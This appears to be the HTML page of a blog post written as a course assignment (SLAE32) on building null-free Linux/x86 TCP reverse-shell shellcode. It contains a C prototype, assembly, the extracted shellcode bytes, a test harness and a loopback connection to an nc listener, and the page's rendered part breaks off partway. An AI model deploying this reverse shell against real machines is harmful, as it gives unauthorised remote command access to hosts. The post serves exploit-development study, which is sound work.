@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SLAE32 Assignment 2 - TCP Reverse Shellcode | nibbles</title>
+<meta name="keywords" content="slae32">
+<meta name="description" content="This post introduces the second mission to my SLAE32 journey.
+I spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won&rsquo;t be as much detailed this time but guess what?
+The best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!
+Introduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode.">
+<meta name="author" content="nibbles">
+<link rel="canonical" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SLAE32 Assignment 2 - TCP Reverse Shellcode" />
+<meta property="og:description" content="This post introduces the second mission to my SLAE32 journey.
+I spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won&rsquo;t be as much detailed this time but guess what?
+The best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!
+Introduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-28T01:59:06+00:00" />
+<meta property="article:modified_time" content="2022-12-28T01:59:06+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SLAE32 Assignment 2 - TCP Reverse Shellcode"/>
+<meta name="twitter:description" content="This post introduces the second mission to my SLAE32 journey.
+I spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won&rsquo;t be as much detailed this time but guess what?
+The best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!
+Introduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xnibbles.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SLAE32 Assignment 2 - TCP Reverse Shellcode",
+      "item": "https://0xnibbles.github.io/posts/slae32/slae_32_assignment_2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SLAE32 Assignment 2 - TCP Reverse Shellcode",
+  "name": "SLAE32 Assignment 2 - TCP Reverse Shellcode",
+  "description": "This post introduces the second mission to my SLAE32 journey.\nI spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won\u0026rsquo;t be as much detailed this time but guess what?\nThe best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!\nIntroduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode.",
+  "keywords": [
+    "slae32"
+  ],
+  "articleBody": " This post introduces the second mission to my SLAE32 journey.\nI spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won’t be as much detailed this time but guess what?\nThe best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!\nIntroduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode.\nThe requirements are:\nReverse shell connects to the configured IP and port; Executing a shell on successful connection; The shellcode should be null-free; With the ability for the IP and port to be easily configurable. In other words, the IP and connection port should be easy to set up for the user. What is a Reverse Shell? A reverse shell instead of waiting for connections it connects back to a remote machine which is waiting for a connection of the target machine.\nThe input and output are redirect to the reverse shell socket so the remote machine can interact with the target machine remotely.\nA TCP reverse shell is a common technique to bypass firewall restrictions and have access to systems that are unreachable from public networks.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper reverse shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP reverse shell implementation in a higher-level language, such as C.\nC Prototype Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n#include #include #include #include #include int main () { const char* ip = \"127.0.0.1\";\t// Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9001); addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); // 1) Socket Syscall int sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Connect Syscall connect(sockfd, (struct sockadr *)\u0026addr, sizeof(addr)); // 3) Dup2 Syscall for (int i = 0; i \u003c 3;i++) { dup2(sockfd, i); } // 4) Execve Syscall execve(\"/bin/sh\", NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc reverse.c -o reverse\nAs this is a reverse shell, we first need to execute a listener for port 9001 with nc. Then we can run reverse to establish a connection back to our listener.\nThe C reverse shell works as expected. From this we have a reference to build our shellcode.\nChecking which syscalls are used In total there are 4 syscalls enumerated below:\n*socket* - 359 - 0x167 connect - 362 - 0x16a --\u003e new syscall *dup2* - 63 - 0x3f *execve* - 11 - 0xb The highlighted syscalls we already have the code from the previous assignment. The new addition is the connect syscall. The difference for the bind shell instead of defining a local interface we need to specify a remote IP and a port.\nWe can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definiton of each syscall.\nAs connect is the only new syscall I will only focused to review only that one. For the other please check assignment 1.\nConnect syscall (0x16a) The C code defines it as the following:\nStruct sockaddr_in // Server Address struct int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; Connect syscall // Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9001); addr.sin_addr.s_addr = inet_addr(\"127.0.0.1\"); // 1) Socket Syscall int sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Connect Syscall connect(sockfd, (struct sockadr *)\u0026addr, sizeof(addr)); With the following arguments:\nint sockfd - sockfd is the socket descriptor returned by socket() in eax. const struct sockaddr *addr - pointer to struct sockaddr that contains information about your IP address and por socklen_t addrlen - addrlen specifies the size, in bytes, of the address structure pointed to by addr. In other words, addrlen is set to sizeof(struct sockaddr). The explanation on how to setup the value for these parameters is also the same provided in assignment 1 (2 - Bind Syscall (0x169) section).\n“Assembling” our shellcode For this one I didn’t put on effort to reduce the size of the shellcode. The isntructions here for same syscalls do the same thing but use more space in memory.\nxor eax, eax xor ebx, ebx xor ecx, ecx cdq ; zeroes edx (trick to use less space) After this it’s time to set up the syscall arguments havinmg the C code as a reference.\n; socket syscall mov ax, 0x167 mov bl, 0x02 mov cl, 0x01 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax EAX contains 0x167 which is sys_socket as seen in /usr/include/i386-linux-gnu/asm/unistd_32.h, then EBX is set to 0x2 (PF_INET).\nNext the value 0x01 is moved into ECX which is the value of SOCK_STREAM. EDX is already zero because of the previous cdq instruction.\nJust left to use the interruption syscall int 0x80 to create the socket.\nIf executed successfully, we have our socket. The next step is to setting up the connect syscall.\nBeforehand, let’s prepare the next syscall which is connect\n; accept syscall mov ebx, eax ; moves socket address to ebx (first arg of bind syscall - sockfd) xor eax, eax Then , the sockaddr_in struct is created as follows:\n; sockaddr struct push edx\t; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u003e 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u003e 9001 = 0x2329 push word 0x2 mov ecx, esp The struct is finally defined. The most trickiest part to understand I must say.\nEDX is still zero so pushing zeroes will determine the end of the struct.\nNext, we push 0x0201017f which is the remote IP address (127.1.1.2).\nWhy 127.1.1.2 and 127.0.0.1?\nThe address 127.0.0.1 contains null-bytes (0x0100007f) which would break our shellcode. We need to go with an alternative way.\nBy using 127.1.1.2, we avoid those null bytes (0x0201017f). This works because the localhost address has a netmask of 255.0.0.0. The only limitation is the first 8 bytes, which is why the address 127.0.0.1 behaves the same way.\nThe next step is to load the stack with the port number. As intel works with the little-endian format, we push 0x2923, which is the value 9001. Lastly, pushing 0x2 refers to AF_INET.\nNow, it is just a matter of putting 0x10 (16 bytes) to EDX which represents the size of sockaddr_in struct as mentioned in the previous section and execute the bind syscall with 0x169 in EAX.\nmov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 It ends-up like this\n; connect syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax ; sockaddr struct push edx\t; ; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u003e 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u003e 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 For dup2 we use a loop to use less instructions to save space while constructing a fully interactive bind shell.\n; dup2 syscall mov edx, eax ; edx is already zero mov cl, 0x03 dup2: ;xor eax, eax ;mov al, 0x3f push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 We reach the final stage, using execve syscall to execute /bin/sh and spawn a shell when a connection is made to the bind port. If all works as expected a system shell will be provided to the incoming connection which can interact with the target machine.\n; execve xor eax, eax cdq push eax push 0x68732f2f ; \"hs//\" push 0x6e69622f ; \"nib/\" mov ebx, esp mov al, 0xb int 0x80\tTo help reverting the string used with execve I develop a script called the The x86 \"Little-Hexdian\" String Convert which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py\nFinal Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 2 : TCP Reverse Shell (Linux/x86) Assembly ; File Name : reverse_shell.nasm global\t_start section\t.text _start: global\t_start section\t.text _start: xor eax, eax xor ebx, ebx xor ecx, ecx cdq ; zeroes edx ; socket syscall mov ax, 0x167 mov bl, 0x02 mov cl, 0x01 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax ; connect syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax ; sockaddr struct push edx\t; ; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u003e 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u003e 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 ; dup2 xor ecx, ecx mov cl, 0x03 dup2: xor eax, eax mov al, 0x3f ;mov ebx, edi dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 ; execve xor eax, eax cdq push eax push 0x68732f2f ; \"hs//\" push 0x6e69622f ; \"nib/\" mov ebx, esp mov al, 0xb int 0x80\tCompiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ls bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o biShell.sh original_bind_shell.nasm syscalls ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ../../assembler.sh bind_shell.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 78 \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x02\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x02\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ Let’s use nc to create a listener on port 9001 and then execute rev_shell to connect it.\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./rev_shell Shellcode Length: 78 ──────────────────────────────────────────────────── ╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [127.1.1.2] from (UNKNOWN) [127.0.0.1] 35190 id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) rev_shell executes with no errors and it connects back to our listener!\nWhat if we want to change the IP address and the port? One of the requirements for this assigment, is the ability to change easily the IP address and port used in the shellcode. For that, we can change the bytes in shellcode related to the port and changed them for specific port we want the bind shell waits for a connection.\nThe following shell script named revShell.sh replaces the hardcoded 9001 with the port provided by the user as an argument. It automatically converts the port into hexadecimal little-endian format.\nAvailable at https://github.com/0xnibbles/slae_x86/blob/main/assignments/2-Shell_Reverse_TCP/revShell.sh\nIt accepts two arguments - the desired IP address and port.\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./revShell.sh Usage: ./revShell.sh ",
+  "wordCount" : "2025",
+  "inLanguage": "en",
+  "datePublished": "2022-12-28T01:59:06Z",
+  "dateModified": "2022-12-28T01:59:06Z",
+  "author":{
+    "@type": "Person",
+    "name": "nibbles"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xnibbles.github.io/posts/slae32/slae_32_assignment_2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nibbles",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xnibbles.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xnibbles.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/about.html" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      SLAE32 Assignment 2 - TCP Reverse Shellcode
+    </h1>
+    <div class="post-meta"><span title='2022-12-28 01:59:06 +0000 UTC'>December 28, 2022</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;nibbles
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a><ul>
+                        
+                <li>
+                    <a href="#what-is-a-reverse-shell" aria-label="What is a Reverse Shell?">What is a Reverse Shell?</a></li></ul>
+                </li>
+                <li>
+                    <a href="#basics-first" aria-label="Basics First">Basics First</a><ul>
+                        
+                <li>
+                    <a href="#c-prototype" aria-label="C Prototype">C Prototype</a></li>
+                <li>
+                    <a href="#checking-which-syscalls-are-used" aria-label="Checking which syscalls are used">Checking which syscalls are used</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#connect-syscall-0x16a" aria-label="Connect syscall (0x16a)">Connect syscall (0x16a)</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#assembling-our-shellcode" aria-label="&amp;ldquo;Assembling&amp;rdquo; our shellcode">&ldquo;Assembling&rdquo; our shellcode</a></li>
+                <li>
+                    <a href="#final-assembly-code" aria-label="Final Assembly Code">Final Assembly Code</a></li>
+                <li>
+                    <a href="#compiling-and-testing-the-shellcode" aria-label="Compiling and Testing the Shellcode">Compiling and Testing the Shellcode</a><ul>
+                        
+                <li>
+                    <a href="#what-if-we-want-to-change-the-ip-address-and-the-port" aria-label="What if we want to change the IP address and the port?">What if we want to change the IP address and the port?</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
+</p>
+<p>This post introduces the second mission to my SLAE32 journey.</p>
+<p>I spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won&rsquo;t be as much detailed this time but guess what?<br>
+The best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!</p>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode.</p>
+<p>The requirements are:</p>
+<ul>
+<li>Reverse shell connects to the configured IP and port;</li>
+<li>Executing a shell on successful connection;</li>
+<li>The shellcode should be <strong>null-free</strong>;</li>
+<li>With the ability for the <strong>IP and port to be easily configurable</strong>. In other words, the IP and connection port should be easy to set up for the user.</li>
+</ul>
+<h3 id="what-is-a-reverse-shell">What is a Reverse Shell?<a hidden class="anchor" aria-hidden="true" href="#what-is-a-reverse-shell">#</a></h3>
+<p>A reverse shell instead of waiting for connections it connects back to a remote machine which is waiting for a connection of the target machine.</p>
+<p>The input and output are redirect to the reverse shell socket so the remote machine can interact with the target machine remotely.</p>
+<p><img loading="lazy" src="/slae32/2/reverseshell.png#center" alt="Reverse Shell"  title="Reverse Shell"  />
+</p>
+<p>A TCP reverse shell is a common technique to bypass firewall restrictions and have access to systems that are unreachable from public networks.</p>
+<h2 id="basics-first">Basics First<a hidden class="anchor" aria-hidden="true" href="#basics-first">#</a></h2>
+<p>Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper reverse shell. This way, we will better understand how the <em>internals</em> work and where to debug if an error occurs.</p>
+<p>My approach was to analyze TCP reverse shell implementation in a higher-level language, such as C.</p>
+<h3 id="c-prototype">C Prototype<a hidden class="anchor" aria-hidden="true" href="#c-prototype">#</a></h3>
+<p>Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/socket.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;netinet/ip.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;arpa/inet.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> () {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;	
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Address struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> sockaddr_in addr;
+</span></span><span style="display:flex;"><span>	addr.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>	addr.sin_port <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">9001</span>);
+</span></span><span style="display:flex;"><span>	addr.sin_addr.s_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 1) Socket Syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">int</span> sockfd <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 2) Connect Syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">connect</span>(sockfd, (<span style="color:#66d9ef">struct</span> sockadr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 3) Dup2 Syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>;i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dup2</span>(sockfd, i);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 4) Execve Syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">execve</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, NULL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Testing the code to see how it behaves.</p>
+<p>Compiling with <em>gcc</em></p>
+<p><code>$ gcc reverse.c -o reverse</code></p>
+<p>As this is a reverse shell, we first need to execute a listener for port 9001 with <em>nc</em>. Then we can run <em>reverse</em> to establish a connection back to our listener.</p>
+<p><img loading="lazy" src="/slae32/2/image.png#center" alt="C Reverse Shell"  title="C Reverse Shell"  />
+</p>
+<p>The C reverse  shell works as expected. From this we have a reference to build our shellcode.</p>
+<h3 id="checking-which-syscalls-are-used">Checking which syscalls are used<a hidden class="anchor" aria-hidden="true" href="#checking-which-syscalls-are-used">#</a></h3>
+<p>In total there are 4 syscalls enumerated below:</p>
+<pre tabindex="0"><code>*socket* - 359 - 0x167
+connect - 362 - 0x16a --&gt; new syscall
+*dup2* - 63 - 0x3f
+*execve* - 11 - 0xb
+</code></pre><p>The highlighted syscalls we already have the code from the previous assignment. The new addition is the <strong>connect</strong> syscall. The difference for the bind shell instead of defining a local interface we need to specify a <strong>remote IP and a port</strong>.</p>
+<p>We can use the file <code>/usr/include/x86_64-linux-gnu/asm/unistd_32 </code> to check the definiton of each syscall.</p>
+<p>As <strong>connect</strong> is the only new syscall I will only focused to review only that one. For the other please check assignment 1.</p>
+<h5 id="connect-syscall-0x16a">Connect syscall (0x16a)<a hidden class="anchor" aria-hidden="true" href="#connect-syscall-0x16a">#</a></h5>
+<p>The C code defines it as the following:</p>
+<ul>
+<li>Struct sockaddr_in</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Server Address struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">int</span> sockfd, acceptfd;
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9001</span>; <span style="color:#75715e">// Server Address struct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">struct</span> sockaddr_in addr;
